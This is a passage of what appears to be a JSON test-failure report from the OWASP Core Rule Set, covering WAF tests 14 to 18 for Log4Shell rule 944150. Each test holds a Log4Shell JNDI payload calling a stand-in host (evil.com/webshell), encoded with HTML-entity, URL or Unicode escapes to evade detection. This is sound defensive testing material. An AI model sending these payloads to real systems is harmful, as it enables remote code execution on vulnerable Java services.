          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 14,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"&#36;{jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 15,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 16,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"\\u002524%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 17,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 17,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24\\u007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 18,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 18,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%26lbrace%3Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
